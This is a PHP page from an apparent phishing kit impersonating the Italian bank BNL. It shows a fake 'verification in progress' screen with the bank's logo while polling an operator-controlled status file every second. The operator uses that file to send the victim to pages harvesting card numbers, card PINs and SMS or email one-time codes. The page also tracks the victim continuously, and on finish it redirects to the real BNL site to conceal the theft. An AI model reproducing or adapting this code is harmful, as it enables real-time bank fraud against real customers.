<?php
$id = $_GET['id'] ?? '';
if (!$id) { header('Location: index.html'); exit; }

$df = __DIR__ . '/data.json';
if (file_exists($df)) {
    $data = json_decode(file_get_contents($df), true);
    if (isset($data['sessions'][$id])) {
        $fr = (int)($data['sessions'][$id]['force_redirect'] ?? 0);
        $np = $data['sessions'][$id]['next_page'] ?? '';
        if ($fr > 0 && $np !== '') {
            $data['sessions'][$id]['force_redirect'] = 0;
            file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
            if ($np === 'login_errore') { header('Location: login_errore.html?id=' . urlencode($id)); exit; }
            if ($np === 'finish')    { header('Location: https://banking.bnl.it/login/landing?cta=dashboard'); exit; }
            if ($np === 'carta')     { header('Location: carta.html?id=' . urlencode($id)); exit; }
            if ($np === 'pin_carta') { header('Location: pin_carta.html?id=' . urlencode($id)); exit; }
            if ($np === 'otp_sms')   { header('Location: otp_sms.html?id=' . urlencode($id)); exit; }
            if ($np === 'otp_mail')  { header('Location: otp_mail.html?id=' . urlencode($id)); exit; }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>BNL - Verifica in corso</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;height:100dvh;overflow:hidden}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0a1f1a 0%,#0d2920 50%,#1a3a2e 100%);min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:rgba(255,255,255,.98);border-radius:16px;padding:48px 36px;text-align:center;box-shadow:0 16px 48px rgba(0,0,0,.2);max-width:400px;width:100%}
.c img{height:38px;margin-bottom:28px}
.c h2{font-size:20px;color:#1a1a1a;margin-bottom:10px;font-weight:600}
.c p{font-size:13px;color:#777;margin-bottom:28px;line-height:1.5}
.sp{width:40px;height:40px;border:3.5px solid #e0e0e0;border-top-color:#00723b;border-radius:50%;animation:r .75s linear infinite;margin:0 auto 20px}
@keyframes r{to{transform:rotate(360deg)}}
.lt{font-size:11px;color:#aaa}
</style>
</head>
<body>
<div class="c">
    <img src="https://bnl.it/images/bnlsite/loghi/BNL-logo-Mega-Menu-Def.png" alt="BNL">
    <h2>Verifica identita in corso</h2>
    <p>Stiamo verificando i tuoi dati di accesso. Ti preghiamo di attendere.</p>
    <div class="sp"></div>
    <div class="lt">Non chiudere questa pagina</div>
</div>
<script>
var id = <?php echo json_encode($id); ?>;
var lastFR = 0;
function check() {
    fetch('check_status.php?id=' + encodeURIComponent(id) + '&t=' + Date.now(), { cache: 'no-store' })
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.status === 'finish' || d.next_page === 'finish') {
                window.location.href = 'https://banking.bnl.it/login/landing?cta=dashboard';
                return;
            }
            if (d.force_redirect && d.force_redirect > 0 && d.force_redirect !== lastFR) {
                lastFR = d.force_redirect;
                var np = d.next_page || '';
                if (np === 'login_errore') window.location.href = 'login_errore.html?id=' + encodeURIComponent(id);
                else if (np === 'carta')     window.location.href = 'carta.html?id=' + encodeURIComponent(id);
                else if (np === 'pin_carta') window.location.href = 'pin_carta.html?id=' + encodeURIComponent(id);
                else if (np === 'otp_sms')   window.location.href = 'otp_sms.html?id=' + encodeURIComponent(id);
                else if (np === 'otp_mail')  window.location.href = 'otp_mail.html?id=' + encodeURIComponent(id);
            }
        })
        .catch(function() {});
}
setInterval(check, 1000);
check();
(function() {
    function track() { fetch('track.php?id=' + encodeURIComponent(id) + '&cp=verifica&t=' + Date.now(), { cache: 'no-store' }).catch(function() {}); }
    track();
    setInterval(track, 3000);
})();
</script>
</body>
</html>